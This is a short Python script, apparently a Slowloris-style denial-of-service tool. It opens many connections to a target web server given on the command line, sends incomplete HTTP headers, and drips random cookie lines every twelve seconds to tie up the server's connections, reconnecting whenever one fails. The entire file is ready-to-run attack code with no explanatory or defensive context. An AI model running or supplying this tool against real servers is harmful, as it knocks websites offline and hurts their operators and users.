import asyncio
from random import choice, randint

def randhex(length):
    from string import hexdigits
    return "".join(choice(hexdigits) for _ in range(length))

@asyncio.coroutine
def doge(loop, host, id, delay):
    initial = "GET /{path} HTTP/1.0\r\nHost: {host}\r\nUser-Agent: doge\r\nContent-Length: 512\r\n".format(
            path=randhex(23), host=host)
    yield from asyncio.sleep(delay)
    while True:
        print("%d opening" % id)
        try:
            r, w = yield from asyncio.open_connection(host, 80)
            print("%d initial" % id)
            w.write(initial.encode())
            for heh in range(8192):
                print("%d phase %d" % (id, heh))
                p = "Cookie: {k}={v}".format(k=randhex(24), v=randhex(24))
                w.write(p.encode())
                yield from asyncio.sleep(12)
            w.close()
            print("%d closed" % id)
        except Exception as e:
            print("%d oops: %s, restarting in %d" % (id, e, delay))
            yield from asyncio.sleep(delay)
            continue

if __name__ == "__main__":
    from argparse import ArgumentParser

    opts = ArgumentParser()
    opts.add_argument("host", type=str)
    opts.add_argument("workers", type=int)

    args = opts.parse_args()

    loop = asyncio.get_event_loop()
    doges = [doge(loop, args.host, id, randint(2, 20))
             for id in range(args.workers)]
    loop.run_until_complete(asyncio.wait(doges))
    loop.close()
